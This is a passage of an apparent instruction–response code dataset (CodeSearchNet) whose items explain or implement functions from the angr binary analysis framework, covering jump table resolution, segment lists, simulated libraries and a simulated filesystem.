pylint: disable=too-many-nested-blocks\n        for src_irsb, _ in sources:\n            # Use slicecutor to execute each one, and get the address\n            # We simply give up if any exception occurs on the way\n            start_state = self._initial_state(src_irsb)\n            # Keep IP symbolic to avoid unnecessary concretization\n            start_state.options.add(o.KEEP_IP_SYMBOLIC)\n            start_state.options.add(o.NO_IP_CONCRETIZATION)\n            # be quiet!!!!!!\n            start_state.options.add(o.SYMBOL_FILL_UNCONSTRAINED_REGISTERS)\n            start_state.options.add(o.SYMBOL_FILL_UNCONSTRAINED_MEMORY)\n\n            # any read from an uninitialized segment should be unconstrained\n            if self._bss_regions:\n                bss_memory_read_bp = BP(when=BP_BEFORE, enabled=True, action=self._bss_memory_read_hook)\n                start_state.inspect.add_breakpoint('mem_read', bss_memory_read_bp)\n\n            # FIXME:\n            # this is a hack: for certain architectures, we do not initialize the base pointer, since the jump table on\n            # those architectures may use the bp register to store value\n            if not self.project.arch.name in {'S390X'}:\n                start_state.regs.bp = start_state.arch.initial_sp + 0x2000\n\n            self._cached_memread_addrs.clear()\n            init_registers_on_demand_bp = BP(when=BP_BEFORE, enabled=True, action=self._init_registers_on_demand)\n            start_state.inspect.add_breakpoint('mem_read', init_registers_on_demand_bp)\n\n            # Create the slicecutor\n            simgr = self.project.factory.simulation_manager(start_state, resilience=True)\n            slicecutor = Slicecutor(annotatedcfg, force_taking_exit=True)\n            simgr.use_technique(slicecutor)\n            simgr.use_technique(Explorer(find=load_stmt_loc[0]))\n\n            # Run it!\n            try:\n                simgr.run()\n            except KeyError as ex:\n                # This is because the program slice is incomplete.\n                # Blade will support more IRExprs and IRStmts\n                l.debug(\"KeyError occurred due to incomplete program slice.\", exc_info=ex)\n                continue\n\n            # Get the jumping targets\n            for r in simgr.found:\n                try:\n                    whitelist = annotatedcfg.get_whitelisted_statements(r.addr)\n                    last_stmt = annotatedcfg.get_last_statement_index(r.addr)\n                    succ = project.factory.successors(r, whitelist=whitelist, last_stmt=last_stmt)\n                except (AngrError, SimError):\n                    # oops there are errors\n                    l.warning('Cannot get jump successor states from a path that has reached the target. Skip it.')\n                    continue\n                all_states = succ.flat_successors + succ.unconstrained_successors\n                if not all_states:\n                    l.warning(\"Slicecutor failed to execute the program slice. No output state is available.\")\n                    continue\n\n                state = all_states[0]  # Just take the first state\n                self._cached_memread_addrs.clear()  # clear the cache to save some memory (and avoid confusion when\n                                                    # debugging)\n\n                # Parse the memory load statement and get the memory address of where the jump table is stored\n                jumptable_addr = self._parse_load_statement(load_stmt, state)\n                if jumptable_addr is None:\n                    continue\n\n                # sanity check and necessary pre-processing\n                if stmts_adding_base_addr:\n                    assert len(stmts_adding_base_addr) == 1  # Making sure we are only dealing with one operation here\n                    jump_base_addr = stmts_adding_base_addr[0]\n                    if jump_base_addr.base_addr_available:\n                        addr_holders = { (jump_base_addr.stmt_loc[0], jump_base_addr.tmp) }\n                    else:\n                        addr_holders = { (jump_base_addr.stmt_loc[0], jump_base_addr.tmp),\n                                         (jump_base_addr.stmt_loc[0], jump_base_addr.tmp_1)\n                                         }\n                    if len(set(all_addr_holders.keys()).intersection(addr_holders)) != 1:\n                        # for some reason it's trying to add a base address onto a different temporary variable that we\n                        # are not aware of. skip.\n                        continue\n\n                    if not jump_base_addr.base_addr_available:\n                        # we need to decide which tmp is the address holder and which tmp holds the base address\n                        addr_holder = next(iter(set(all_addr_holders.keys()).intersection(addr_holders)))\n                        if jump_base_addr.tmp_1 == addr_holder[1]:\n                            # swap the two tmps\n                            jump_base_addr.tmp, jump_base_addr.tmp_1 = jump_base_addr.tmp_1, jump_base_addr.tmp\n                        # Load the concrete base address\n                        jump_base_addr.base_addr = state.solver.eval(state.scratch.temps[jump_base_addr.tmp_1])\n\n                all_targets = [ ]\n                total_cases = jumptable_addr._model_vsa.cardinality\n\n                if total_cases > self._max_targets:\n                    # We resolved too many targets for this indirect jump. Something might have gone wrong.\n                    l.debug(\"%d targets are resolved for the indirect jump at %#x. It may not be a jump table. Try the \"\n                            \"next source, if there is any.\",\n                            total_cases, addr)\n                    continue\n\n                    # Or alternatively, we can ask user, which is meh...\n                    #\n                    # jump_base_addr = int(raw_input(\"please give me the jump base addr: \"), 16)\n                    # total_cases = int(raw_input(\"please give me the total cases: \"))\n                    # jump_target = state.solver.SI(bits=64, lower_bound=jump_base_addr, upper_bound=jump_base_addr +\n                    # (total_cases - 1) * 8, stride=8)\n\n                jump_table = [ ]\n\n                min_jumptable_addr = state.solver.min(jumptable_addr)\n                max_jumptable_addr = state.solver.max(jumptable_addr)\n\n                # Both the min jump target and the max jump target should be within a mapped memory region\n                # i.e., we shouldn't be jumping to the stack or somewhere unmapped\n                if (not project.loader.find_segment_containing(min_jumptable_addr) or\n                        not project.loader.find_segment_containing(max_jumptable_addr)):\n                    if (not project.loader.find_section_containing(min_jumptable_addr) or\n                            not project.loader.find_section_containing(max_jumptable_addr)):\n\n                        l.debug(\"Jump table %#x might have jump targets outside mapped memory regions. \"\n                                \"Continue to resolve it from the next data source.\", addr)\n                        continue\n\n                # Load the jump table from memory\n                for idx, a in enumerate(state.solver.eval_upto(jumptable_addr, total_cases)):\n                    if idx % 100 == 0 and idx != 0:\n                        l.debug(\"%d targets have been resolved for the indirect jump at %#x...\", idx, addr)\n                    target = cfg._fast_memory_load_pointer(a, size=load_size)\n                    all_targets.append(target)\n\n                # Adjust entries inside the jump table\n                if stmts_adding_base_addr:\n                    stmt_adding_base_addr = stmts_adding_base_addr[0]\n                    base_addr = stmt_adding_base_addr.base_addr\n                    conversion_ops = list(reversed(list(v for v in all_addr_holders.values()\n                                                   if v is not AddressTransferringTypes.Assignment)))\n                    if conversion_ops:\n                        invert_conversion_ops = [ ]\n                        for conversion_op in conversion_ops:\n                            if conversion_op is AddressTransferringTypes.SignedExtension32to64:\n                                lam = lambda a: (a | 0xffffffff00000000) if a >= 0x80000000 else a\n                            elif conversion_op is AddressTransferringTypes.UnsignedExtension32to64:\n                                lam = lambda a: a\n                            elif conversion_op is AddressTransferringTypes.Truncation64to32:\n                                lam = lambda a: a & 0xffffffff\n                            else:\n                                raise NotImplementedError(\"Unsupported conversion operation.\")\n                            invert_conversion_ops.append(lam)\n                        all_targets_copy = all_targets\n                        all_targets = [ ]\n                        for target_ in all_targets_copy:\n                            for lam in invert_conversion_ops:\n                                target_ = lam(target_)\n                            all_targets.append(target_)\n                    mask = (2 ** self.project.arch.bits) - 1\n                    all_targets = [(target + base_addr) & mask for target in all_targets]\n\n                # Finally... all targets are ready\n                illegal_target_found = False\n                for target in all_targets:\n                    # if the total number of targets is suspicious (it usually implies a failure in applying the\n                    # constraints), check if all jump targets are legal\n                    if len(all_targets) in {0x100, 0x10000} and not self._is_jumptarget_legal(target):\n                        l.info(\"Jump target %#x is probably illegal. Try to resolve indirect jump at %#x from the next \"\n                               \"source.\", target, addr)\n                        illegal_target_found = True\n                        break\n                    jump_table.append(target)\n                if illegal_target_found:\n                    continue\n\n                l.info(\"Resolved %d targets from %#x.\", len(all_targets), addr)\n\n                # write to the IndirectJump object in CFG\n                ij = cfg.indirect_jumps[addr]\n                if total_cases > 1:\n                    # It can be considered a jump table only if there are more than one jump target\n                    ij.jumptable = True\n                    ij.jumptable_addr = state.solver.min(jumptable_addr)\n                    ij.resolved_targets = set(jump_table)\n                    ij.jumptable_entries = jump_table\n                else:\n                    ij.jumptable = False\n                    ij.resolved_targets = set(jump_table)\n\n                return True, all_targets\n\n        l.info(\"Could not resolve indirect jump %#x in funtion %#x.\", addr, func_addr)\n        return False, None", "response": "Resolves indirect jump tables."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _parse_load_statement(load_stmt, state):\n\n        # The jump table address is stored in a tmp. In this case, we find the jump-target loading tmp.\n        load_addr_tmp = None\n\n        if isinstance(load_stmt, pyvex.IRStmt.WrTmp):\n            if type(load_stmt.data.addr) is pyvex.IRExpr.RdTmp:\n                load_addr_tmp = load_stmt.data.addr.tmp\n            elif type(load_stmt.data.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  ldr r0, =main+1\n                #  blx r0\n                # It's not a jump table, but we resolve it anyway\n                jump_target_addr = load_stmt.data.addr.con.value\n                return state.solver.BVV(jump_target_addr, state.arch.bits)\n        elif isinstance(load_stmt, pyvex.IRStmt.LoadG):\n            if type(load_stmt.addr) is pyvex.IRExpr.RdTmp:\n                load_addr_tmp = load_stmt.addr.tmp\n            elif type(load_stmt.addr) is pyvex.IRExpr.Const:\n                # It's directly loading from a constant address\n                # e.g.,\n                #  4352c     SUB     R1, R11, #0x1000\n                #  43530     LDRHI   R3, =loc_45450\n                #  ...\n                #  43540     MOV     PC, R3\n                #\n                # It's not a jump table, but we resolve it anyway\n                # Note that this block has two branches: One goes to 45450, the other one goes to whatever the original\n                # value of R3 is. Some intensive data-flow analysis is required in this case.\n                jump_target_addr = load_stmt.addr.con.value\n                return state.solver.BVV(jump_target_addr, state.arch.bits)\n        else:\n            raise TypeError(\"Unsupported address loading statement type %s.\" % type(load_stmt))\n\n        if state.scratch.temps[load_addr_tmp] is None:\n            # the tmp variable is not there... umm...\n            return None\n\n        jump_addr = state.scratch.temps[load_addr_tmp]\n\n        if isinstance(load_stmt, pyvex.IRStmt.LoadG):\n            # LoadG comes with a guard. We should apply this guard to the load expression\n            guard_tmp = load_stmt.guard.tmp\n            guard = state.scratch.temps[guard_tmp] != 0\n            try:\n                jump_addr = state.memory._apply_condition_to_symbolic_addr(jump_addr, guard)\n            except Exception: # pylint: disable=broad-except\n                l.exception(\"Error computing jump table address!\")\n                return None\n        return jump_addr", "response": "Parse a memory load statement and return the jump target addresses."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsearches the segment list for the entry that the address addr belongs to and returns the offset of that segment.", "response": "def _search(self, addr):\n        \"\"\"\n        Checks which segment that the address `addr` should belong to, and, returns the offset of that segment.\n        Note that the address may not actually belong to the block.\n\n        :param addr: The address to search\n        :return: The offset of the segment.\n        \"\"\"\n\n        start = 0\n        end = len(self._list)\n\n        while start != end:\n            mid = (start + end) // 2\n\n            segment = self._list[mid]\n            if addr < segment.start:\n                end = mid\n            elif addr >= segment.end:\n                start = mid + 1\n            else:\n                # Overlapped :(\n                start = mid\n                break\n\n        return start"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _insert_and_merge(self, address, size, sort, idx):\n\n        # sanity check\n        if idx > 0 and address + size <= self._list[idx - 1].start:\n            # There is a bug, since _list[idx] must be the closest one that is less than the current segment\n            l.warning(\"BUG FOUND: new segment should always be greater than _list[idx].\")\n            # Anyways, let's fix it.\n            self._insert_and_merge(address, size, sort, idx - 1)\n            return\n\n        # Insert the block first\n        # The new block might be overlapping with other blocks. _insert_and_merge_core will fix the overlapping.\n        if idx == len(self._list):\n            self._list.append(Segment(address, address + size, sort))\n        else:\n            self._list.insert(idx, Segment(address, address + size, sort))\n        # Apparently _bytes_occupied will be wrong if the new block overlaps with any existing block. We will fix it\n        # later\n        self._bytes_occupied += size\n\n        # Search forward to merge blocks if necessary\n        pos = idx\n        while pos < len(self._list):\n            merged, pos, bytes_change = self._insert_and_merge_core(pos, \"forward\")\n\n            if not merged:\n                break\n\n            self._bytes_occupied += bytes_change\n\n        # Search backward to merge blocks if necessary\n        if pos >= len(self._list):\n            pos = len(self._list) - 1\n\n        while pos > 0:\n            merged, pos, bytes_change = self._insert_and_merge_core(pos, \"backward\")\n\n            if not merged:\n                break\n\n            self._bytes_occupied += bytes_change", "response": "Insert a new entry into the internal list and merge it with the other entries."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _dbg_output(self):\n        s = \"[\"\n        lst = []\n        for segment in self._list:\n            lst.append(repr(segment))\n        s += \", \".join(lst)\n        s += \"]\"\n        return s", "response": "Returns a string representation of the segments that form this SegmentList\n       "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck that all segments with same sort do not overlap with the same start and end.", "response": "def _debug_check(self):\n        \"\"\"\n        Iterates over list checking segments with same sort do not overlap\n\n        :raise: Exception: if segments overlap space with same sort\n        \"\"\"\n        # old_start = 0\n        old_end = 0\n        old_sort = \"\"\n        for segment in self._list:\n            if segment.start <= old_end and segment.sort == old_sort:\n                raise AngrCFGError(\"Error in SegmentList: blocks are not merged\")\n            # old_start = start\n            old_end = segment.end\n            old_sort = segment.sort"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef next_free_pos(self, address):\n\n        idx = self._search(address)\n        if idx < len(self._list) and self._list[idx].start <= address < self._list[idx].end:\n            # Occupied\n            i = idx\n            while i + 1 < len(self._list) and self._list[i].end == self._list[i + 1].start:\n                i += 1\n            if i == len(self._list):\n                return self._list[-1].end\n\n            return self._list[i].end\n\n        return address", "response": "Returns the next free position with respect to an address including that address itself"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef next_pos_with_sort_not_in(self, address, sorts, max_distance=None):\n\n        list_length = len(self._list)\n\n        idx = self._search(address)\n        if idx < list_length:\n            # Occupied\n            block = self._list[idx]\n\n            if max_distance is not None and address + max_distance < block.start:\n                return None\n\n            if block.start <= address < block.end:\n                # the address is inside the current block\n                if block.sort not in sorts:\n                    return address\n                # tick the idx forward by 1\n                idx += 1\n\n            i = idx\n            while i < list_length:\n                if max_distance is not None and address + max_distance < self._list[i].start:\n                    return None\n                if self._list[i].sort not in sorts:\n                    return self._list[i].start\n                i += 1\n\n        return None", "response": "Returns the next position in the list that is not in the specified sort list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if an address belongs to any segment in the cache.", "response": "def is_occupied(self, address):\n        \"\"\"\n        Check if an address belongs to any segment\n\n        :param address: The address to check\n        :return: True if this address belongs to a segment, False otherwise\n        \"\"\"\n\n        idx = self._search(address)\n        if len(self._list) <= idx:\n            return False\n        if self._list[idx].start <= address < self._list[idx].end:\n            return True\n        if idx > 0 and address < self._list[idx - 1].end:\n            # TODO: It seems that this branch is never reached. Should it be removed?\n            return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef occupied_by_sort(self, address):\n\n        idx = self._search(address)\n        if len(self._list) <= idx:\n            return None\n        if self._list[idx].start <= address < self._list[idx].end:\n            return self._list[idx].sort\n        if idx > 0 and address < self._list[idx - 1].end:\n            # TODO: It seems that this branch is never reached. Should it be removed?\n            return self._list[idx - 1].sort\n        return None", "response": "Checks if an address belongs to any segment and returns the sort of the segment that occupies this address"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a block to the segment list.", "response": "def occupy(self, address, size, sort):\n        \"\"\"\n        Include a block, specified by (address, size), in this segment list.\n\n        :param int address:     The starting address of the block.\n        :param int size:        Size of the block.\n        :param str sort:        Type of the block.\n        :return: None\n        \"\"\"\n\n        if size is None or size <= 0:\n            # Cannot occupy a non-existent block\n            return\n\n        # l.debug(\"Occpuying 0x%08x-0x%08x\", address, address + size)\n        if not self._list:\n            self._list.append(Segment(address, address + size, sort))\n            self._bytes_occupied += size\n            return\n        # Find adjacent element in our list\n        idx = self._search(address)\n        # print idx\n\n        self._insert_and_merge(address, size, sort, idx)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef copy(self):\n        n = SegmentList()\n\n        n._list = [ a.copy() for a in self._list ]\n        n._bytes_occupied = self._bytes_occupied\n        return n", "response": "Make a copy of the SegmentList instance."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _analyze_function(self):\n\n        if not self._function.is_simprocedure \\\n                and not self._function.is_plt \\\n                and not self._variable_manager.has_function_manager(self._function.addr):\n            l.warning(\"Please run variable recovery on %s before analyzing its calling conventions.\",\n                      repr(self._function))\n            return None\n\n        vm = self._variable_manager[self._function.addr]\n\n        input_variables = vm.input_variables()\n\n        input_args = self._args_from_vars(input_variables)\n\n        # TODO: properly decide sp_delta\n        sp_delta = self.project.arch.bytes if self.project.arch.call_pushes_ret else 0\n\n        cc = SimCC.find_cc(self.project.arch, list(input_args), sp_delta)\n\n        if cc is None:\n            l.warning('_analyze_function(): Cannot find a calling convention that fits the given arguments.')\n\n        return cc", "response": "Return the calling convention that this function is in."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ntests if the given variable is a sane register variable.", "response": "def _is_sane_register_variable(self, variable):\n        \"\"\"\n        Filters all registers that are surly not members of function arguments.\n        This can be seen as a workaround, since VariableRecoveryFast sometimes gives input variables of cc_ndep (which\n        is a VEX-specific register) :-(\n\n        :param SimRegisterVariable variable: The variable to test.\n        :return:                             True if it is an acceptable function argument, False otherwise.\n        :rtype:                              bool\n        \"\"\"\n\n        arch = self.project.arch\n\n        if arch.name == 'AARCH64':\n            return 16 <= variable.reg < 80  # x0-x7\n\n        elif arch.name == 'AMD64':\n            return (24 <= variable.reg < 40 or  # rcx, rdx\n                    64 <= variable.reg < 104 or  # rsi, rdi, r8, r9, r10\n                    224 <= variable.reg < 480)  # xmm0-xmm7\n\n        elif is_arm_arch(arch):\n            return 8 <= variable.reg < 24  # r0-r3\n\n        elif arch.name == 'MIPS32':\n            return 24 <= variable.reg < 40  # a0-a3\n\n        elif arch.name == 'PPC32':\n            return 28 <= variable.reg < 60  # r3-r10\n\n        elif arch.name == 'X86':\n            return (8 <= variable.reg < 24 or  # eax, ebx, ecx, edx\n                    160 <= variable.reg < 288)  # xmm0-xmm7\n\n        else:\n            l.critical('Unsupported architecture %s.', arch.name)\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef copy(self):\n        o = SimLibrary()\n        o.procedures = dict(self.procedures)\n        o.non_returning = set(self.non_returning)\n        o.prototypes = dict(self.prototypes)\n        o.default_ccs = dict(self.default_ccs)\n        o.names = list(self.names)\n        return o", "response": "Make a copy of this SimLibrary allowing it to be mutated without affecting the global version."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, other):\n        self.procedures.update(other.procedures)\n        self.non_returning.update(other.non_returning)\n        self.prototypes.update(other.prototypes)\n        self.default_ccs.update(other.default_ccs)", "response": "Augment this SimLibrary with the information from another SimLibrary."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset some common names of this library by which it may be referred during linking.", "response": "def set_library_names(self, *names):\n        \"\"\"\n        Set some common names of this library by which it may be referred during linking\n\n        :param names:   Any number of string library names may be passed as varargs.\n        \"\"\"\n        for name in names:\n            self.names.append(name)\n            SIM_LIBRARIES[name] = self"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_default_cc(self, arch_name, cc_cls):\n        arch_name = archinfo.arch_from_id(arch_name).name\n        self.default_ccs[arch_name] = cc_cls", "response": "Set the default calling convention used for this library under a given architecture"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the prototype of a function in the form of a C - style function declaration.", "response": "def set_c_prototype(self, c_decl):\n        \"\"\"\n        Set the prototype of a function in the form of a C-style function declaration.\n\n        :param str c_decl: The C-style declaration of the function.\n        :return:           A tuple of (function name, function prototype)\n        :rtype:            tuple\n        \"\"\"\n\n        parsed = parse_file(c_decl)\n        parsed_decl = parsed[0]\n        if not parsed_decl:\n            raise ValueError('Cannot parse the function prototype.')\n        func_name, func_proto = next(iter(parsed_decl.items()))\n\n        self.set_prototype(func_name, func_proto)\n\n        return func_name, func_proto"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add(self, name, proc_cls, **kwargs):\n        self.procedures[name] = proc_cls(display_name=name, **kwargs)", "response": "Adds a function implementation to the library."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_all_from_dict(self, dictionary, **kwargs):\n        for name, procedure in dictionary.items():\n            self.add(name, procedure, **kwargs)", "response": "Adds all the classes in the given dictionary to the library."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_alias(self, name, *alt_names):\n        old_procedure = self.procedures[name]\n        for alt in alt_names:\n            new_procedure = copy.deepcopy(old_procedure)\n            new_procedure.display_name = alt\n            self.procedures[alt] = new_procedure", "response": "Add some duplicate names for a given function."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting an implementation of the given function specialized for the given arch or a stub procedure if none exists.", "response": "def get(self, name, arch):\n        \"\"\"\n        Get an implementation of the given function specialized for the given arch, or a stub procedure if none exists.\n\n        :param name:    The name of the function as a string\n        :param arch:    The architecure to use, as either a string or an archinfo.Arch instance\n        :return:        A SimProcedure instance representing the function as found in the library\n        \"\"\"\n        if type(arch) is str:\n            arch = archinfo.arch_from_id(arch)\n        if name in self.procedures:\n            proc = copy.deepcopy(self.procedures[name])\n            self._apply_metadata(proc, arch)\n            return proc\n        else:\n            return self.get_stub(name, arch)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_stub(self, name, arch):\n        proc = self.fallback_proc(display_name=name, is_stub=True)\n        self._apply_metadata(proc, arch)\n        return proc", "response": "Returns a SimProcedure instance representing a stub for the given function."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef has_metadata(self, name):\n        return self.has_implementation(name) or \\\n            name in self.non_returning or \\\n            name in self.prototypes", "response": "Check if a function has either an implementation or any metadata associated with it."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef minimum_syscall_number(self, abi):\n        if abi not in self.syscall_number_mapping or \\\n                not self.syscall_number_mapping[abi]:\n            return 0\n        return min(self.syscall_number_mapping[abi])", "response": "Returns the smallest syscall number known for the given abi"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the maximum syscall number known for the given abi", "response": "def maximum_syscall_number(self, abi):\n        \"\"\"\n        :param abi: The abi to evaluate\n        :return:    The largest syscall number known for the given abi\n        \"\"\"\n        if abi not in self.syscall_number_mapping or \\\n                not self.syscall_number_mapping[abi]:\n            return 0\n        return max(self.syscall_number_mapping[abi])"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_number_mapping(self, abi, number, name):\n        self.syscall_number_mapping[abi][number] = name\n        self.syscall_name_mapping[abi][name] = number", "response": "Associate a syscall number with the name of a function present in the underlying library."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds a dictionary mapping syscall numbers to names of functions present in the underlying library.", "response": "def add_number_mapping_from_dict(self, abi, mapping):\n        \"\"\"\n        Batch-associate syscall numbers with names of functions present in the underlying SimLibrary\n\n        :param abi:     The abi for which this mapping applies\n        :param mapping: A dict mapping syscall numbers to function names\n        \"\"\"\n        self.syscall_number_mapping[abi].update(mapping)\n        self.syscall_name_mapping[abi].update(dict(reversed(i) for i in mapping.items()))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a SimProcedure representing a plausable stub that could model the syscall.", "response": "def get_stub(self, number, arch, abi_list=()):\n        \"\"\"\n        Pretty much the intersection of SimLibrary.get_stub() and SimSyscallLibrary.get().\n\n        :param number:      The syscall number\n        :param arch:        The architecture being worked with, as either a string name or an archinfo.Arch\n        :param abi_list:    A list of ABI names that could be used\n        :return:            A SimProcedure representing a plausable stub that could model the syscall\n        \"\"\"\n        name, arch, abi = self._canonicalize(number, arch, abi_list)\n        proc = super(SimSyscallLibrary, self).get_stub(name, arch)\n        self._apply_numerical_metadata(proc, number, arch, abi)\n        l.debug(\"unsupported syscall: %s\", number)\n        return proc"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef has_implementation(self, number, arch, abi_list=()):\n        name, _, _ = self._canonicalize(number, arch, abi_list)\n        return super(SimSyscallLibrary, self).has_implementation(name)", "response": "A method to check if a syscall has an implementation of the given number arch and abi_list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the Claripy expression of a VEX temp value.", "response": "def tmp_expr(self, tmp):\n        \"\"\"\n        Returns the Claripy expression of a VEX temp value.\n\n        :param tmp: the number of the tmp\n        :param simplify: simplify the tmp before returning it\n        :returns: a Claripy expression of the tmp\n        \"\"\"\n        self.state._inspect('tmp_read', BP_BEFORE, tmp_read_num=tmp)\n        try:\n            v = self.temps[tmp]\n            if v is None:\n                raise SimValueError('VEX temp variable %d does not exist. This is usually the result of an incorrect '\n                                    'slicing.' % tmp)\n        except IndexError:\n            raise SimValueError(\"Accessing a temp that is illegal in this tyenv\")\n        self.state._inspect('tmp_read', BP_AFTER, tmp_read_expr=v)\n        return v"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef store_tmp(self, tmp, content, reg_deps=None, tmp_deps=None, deps=None):\n        self.state._inspect('tmp_write', BP_BEFORE, tmp_write_num=tmp, tmp_write_expr=content)\n        tmp = self.state._inspect_getattr('tmp_write_num', tmp)\n        content = self.state._inspect_getattr('tmp_write_expr', content)\n\n        if o.SYMBOLIC_TEMPS not in self.state.options:\n            # Non-symbolic\n            self.temps[tmp] = content\n        else:\n            # Symbolic\n            self.state.add_constraints(self.temps[tmp] == content)\n\n        # get the size, and record the write\n        if o.TRACK_TMP_ACTIONS in self.state.options:\n            data_ao = SimActionObject(content, reg_deps=reg_deps, tmp_deps=tmp_deps, deps=deps, state=self.state)\n            r = SimActionData(self.state, SimActionData.TMP, SimActionData.WRITE, tmp=tmp, data=data_ao, size=content.length)\n            self.state.history.add_action(r)\n\n        self.state._inspect('tmp_write', BP_AFTER)", "response": "Stores a Claripy expression in a VEX temp value."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ntakes a path and returns a simple absolute path as a list of directories from the root", "response": "def _normalize_path(self, path):\n        \"\"\"\n        Takes a path and returns a simple absolute path as a list of directories from the root\n        \"\"\"\n        if type(path) is str:\n            path = path.encode()\n        path = path.split(b'\\0')[0]\n\n        if path[0:1] != self.pathsep:\n            path = self.cwd + self.pathsep + path\n        keys = path.split(self.pathsep)\n        i = 0\n        while i < len(keys):\n            if keys[i] == b'':\n                keys.pop(i)\n            elif keys[i] == b'.':\n                keys.pop(i)\n            elif keys[i] == b'..':\n                keys.pop(i)\n                if i != 0:\n                    keys.pop(i-1)\n                    i -= 1\n            else:\n                i += 1\n        return keys"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchanging the current directory to the given path.", "response": "def chdir(self, path):\n        \"\"\"\n        Changes the current directory to the given path\n        \"\"\"\n        self.cwd = self._join_chunks(self._normalize_path(path))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, path):\n        mountpoint, chunks = self.get_mountpoint(path)\n\n        if mountpoint is None:\n            return self._files.get(self._join_chunks(chunks))\n        else:\n            return mountpoint.get(chunks)", "response": "Get a file from the filesystem. Returns a SimFile or None."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef insert(self, path, simfile):\n        if self.state is not None:\n            simfile.set_state(self.state)\n        mountpoint, chunks = self.get_mountpoint(path)\n\n        if mountpoint is None:\n            self._files[self._join_chunks(chunks)] = simfile\n            return True\n        else:\n            return mountpoint.insert(chunks, simfile)", "response": "Insert a file into the filesystem. Returns whether the operation was successful."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef delete(self, path):\n        mountpoint, chunks = self.get_mountpoint(path)\n        apath = self._join_chunks(chunks)\n\n        if mountpoint is None:\n            try:\n                simfile = self._files.pop(apath)\n            except KeyError:\n                return False\n            else:\n                self.state.history.add_event('fs_unlink', path=apath, unlink_idx=len(self.unlinks))\n                self.unlinks.append((apath, simfile))\n                return True\n        else:\n            return mountpoint.delete(chunks)", "response": "Removes a file from the filesystem. Returns whether the operation was successful."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nadding a mountpoint to the filesystem.", "response": "def mount(self, path, mount):\n        \"\"\"\n        Add a mountpoint to the filesystem.\n        \"\"\"\n        self._mountpoints[self._join_chunks(self._normalize_path(path))] = mount"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nremove a mountpoint from the filesystem.", "response": "def unmount(self, path):\n        \"\"\"\n        Remove a mountpoint from the filesystem.\n        \"\"\"\n        del self._mountpoints[self._join_chunks(self._normalize_path(path))]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_mountpoint(self, path):\n        path_chunks = self._normalize_path(path)\n        for i in range(len(path_chunks) - 1, -1, -1):\n            partial_path = self._join_chunks(path_chunks[:-i])\n            if partial_path in self._mountpoints:\n                mountpoint = self._mountpoints[partial_path]\n                if mountpoint is None:\n                    break\n                return mountpoint, path_chunks[-i:]\n\n        return None, path_chunks", "response": "Look up the mountpoint servicing the given path."}
